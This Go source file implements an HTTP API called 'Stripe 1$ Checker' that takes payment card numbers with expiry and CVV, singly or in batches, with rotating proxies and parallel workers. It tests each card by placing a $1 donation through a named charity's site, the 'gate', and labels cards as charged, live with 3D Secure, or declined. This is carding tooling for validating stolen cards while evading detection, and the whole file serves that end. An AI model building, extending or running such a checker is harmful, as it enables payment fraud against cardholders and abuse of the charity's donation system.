package stripe

import (
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"
)

// ─── Batch types ──────────────────────────────────────────────────────────────

type BatchStripeRequest struct {
	Cards      []string `json:"cards"`
	Proxies    []string `json:"proxies,omitempty"`
	MaxWorkers int      `json:"max_workers,omitempty"`
}

type BatchStripeResponse struct {
	Results    []StripeResult `json:"results"`
	TotalCards int            `json:"total_cards"`
	Elapsed    float64        `json:"elapsed_seconds"`
}

// ─── Handlers ─────────────────────────────────────────────────────────────────

// HandleStripeCheck supports:
//
//	GET  /stripe/check?cc=num|mm|yy|cvv&proxy=...
//	POST /stripe/check  body: {"cc":"...","proxy":"..."}
func HandleStripeCheck(w http.ResponseWriter, r *http.Request) {
	var req StripeRequest

	switch r.Method {
	case http.MethodGet:
		req.CC = r.URL.Query().Get("cc")
		req.Proxy = r.URL.Query().Get("proxy")
	case http.MethodPost:
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
			writeStripeJSON(w, http.StatusBadRequest, map[string]string{
				"error": "Invalid JSON body: " + err.Error(),
			})
			return
		}
	default:
		writeStripeJSON(w, http.StatusMethodNotAllowed, map[string]string{
			"error": "Use GET or POST",
		})
		return
	}

	if req.CC == "" {
		writeStripeJSON(w, http.StatusBadRequest, map[string]string{
			"error": "Missing 'cc' parameter. Format: num|mm|yy|cvv",
		})
		return
	}

	result := CheckStripe(req)
	writeStripeJSON(w, http.StatusOK, result)
}

// HandleStripeBatch handles POST /stripe/batch — multiple cards in parallel
func HandleStripeBatch(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		writeStripeJSON(w, http.StatusMethodNotAllowed, map[string]string{
			"error": "Use POST for batch check",
		})
		return
	}

	var batchReq BatchStripeRequest
	if err := json.NewDecoder(r.Body).Decode(&batchReq); err != nil {
		writeStripeJSON(w, http.StatusBadRequest, map[string]string{
			"error": "Invalid JSON body: " + err.Error(),
		})
		return
	}
	if len(batchReq.Cards) == 0 {
		writeStripeJSON(w, http.StatusBadRequest, map[string]string{
			"error": "'cards' array is required and must not be empty",
		})
		return
	}

	maxWorkers := batchReq.MaxWorkers
	if maxWorkers <= 0 || maxWorkers > 20 {
		maxWorkers = 4
	}

	startTime := time.Now()
	total := len(batchReq.Cards)
	results := make([]StripeResult, total)
	proxyCount := len(batchReq.Proxies)

	sem := make(chan struct{}, maxWorkers)
	var wg sync.WaitGroup

	for i, cc := range batchReq.Cards {
		wg.Add(1)
		sem <- struct{}{}

		proxy := ""
		if proxyCount > 0 {
			proxy = batchReq.Proxies[i%proxyCount]
		}

		go func(idx int, card, prx string) {
			defer wg.Done()
			defer func() { <-sem }()
			defer func() {
				if rc := recover(); rc != nil {
					results[idx] = StripeResult{
						CC:      card,
						Status:  "error",
						Message: fmt.Sprintf("worker panic: %v", rc),
						Gate:    gate,
					}
				}
			}()
			results[idx] = CheckStripe(StripeRequest{CC: card, Proxy: prx})
		}(i, cc, proxy)
	}

	wg.Wait()

	writeStripeJSON(w, http.StatusOK, BatchStripeResponse{
		Results:    results,
		TotalCards: total,
		Elapsed:    time.Since(startTime).Seconds(),
	})
}

// HandleStripeHealth returns service health
func HandleStripeHealth(w http.ResponseWriter, r *http.Request) {
	writeStripeJSON(w, http.StatusOK, map[string]string{
		"status":  "ok",
		"service": "stripe-1dollar-checker",
		"gate":    gate,
	})
}

// HandleStripeRoot returns API info
func HandleStripeRoot(w http.ResponseWriter, r *http.Request) {
	if r.URL.Path != "/" && r.URL.Path != "" {
		http.NotFound(w, r)
		return
	}
	writeStripeJSON(w, http.StatusOK, map[string]any{
		"service": "Stripe 1$ Checker API",
		"version": "1.0.0",
		"gate":    gate,
		"endpoints": map[string]string{
			"single_check": "GET  /stripe/check?cc=NUM|MM|YY|CVV&proxy=PROXY_URL",
			"single_post":  "POST /stripe/check  body: {\"cc\":\"...\",\"proxy\":\"...\"}",
			"batch_check":  "POST /stripe/batch  body: {\"cards\":[...],\"proxies\":[...]}",
			"health":       "GET  /health",
		},
		"response_statuses": map[string]string{
			"charged":     "Card charged successfully ($1 donation placed)",
			"3d_required": "Card is live but 3D Secure / OTP required",
			"declined":    "Card declined by issuing bank",
			"error":       "Technical error (gate down, invalid format, etc.)",
		},
	})
}

// ─── Server entrypoint ────────────────────────────────────────────────────────

func RunStripeServer() {
	port := os.Getenv("STRIPE_PORT")
	if port == "" {
		port = "8088"
	}

	mux := http.NewServeMux()
	mux.HandleFunc("/health", HandleStripeHealth)
	mux.HandleFunc("/stripe/check", HandleStripeCheck)
	mux.HandleFunc("/stripe/batch", HandleStripeBatch)
	mux.HandleFunc("/", HandleStripeRoot)

	// CORS + logging middleware
	handler := corsStripe(logStripe(mux))

	addr := "0.0.0.0:" + port
	fmt.Println(strings.Repeat("=", 65))
	fmt.Println("  Stripe 1$ Checker API — belovedcommunity.org gate")
	fmt.Println(strings.Repeat("=", 65))
	fmt.Printf("  Listening on http://%s\n\n", addr)
	fmt.Println("  Endpoints:")
	fmt.Println("    GET  /stripe/check?cc=NUM|MM|YY|CVV[&proxy=PROXY]")
	fmt.Println("    POST /stripe/check   {\"cc\":\"...\",\"proxy\":\"...\"}")
	fmt.Println("    POST /stripe/batch   {\"cards\":[...],\"proxies\":[...],\"max_workers\":4}")
	fmt.Println("    GET  /health")
	fmt.Println(strings.Repeat("=", 65))

	log.Fatal(http.ListenAndServe(addr, handler))
}

// ─── Middleware ───────────────────────────────────────────────────────────────

func corsStripe(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Access-Control-Allow-Origin", "*")
		w.Header().Set("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
		w.Header().Set("Access-Control-Allow-Headers", "Content-Type, Authorization")
		if r.Method == http.MethodOptions {
			w.WriteHeader(http.StatusOK)
			return
		}
		next.ServeHTTP(w, r)
	})
}

func logStripe(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		start := time.Now()
		log.Printf("[STRIPE] %s %s from %s", r.Method, r.URL.Path, r.RemoteAddr)
		next.ServeHTTP(w, r)
		log.Printf("[STRIPE] %s %s done in %.2fs", r.Method, r.URL.Path, time.Since(start).Seconds())
	})
}

// ─── JSON helper ─────────────────────────────────────────────────────────────

func writeStripeJSON(w http.ResponseWriter, code int, v any) {
	w.Header().Set("Content-Type", "application/json; charset=utf-8")
	w.WriteHeader(code)
	enc := json.NewEncoder(w)
	enc.SetEscapeHTML(false)
	enc.Encode(v) //nolint:errcheck
}
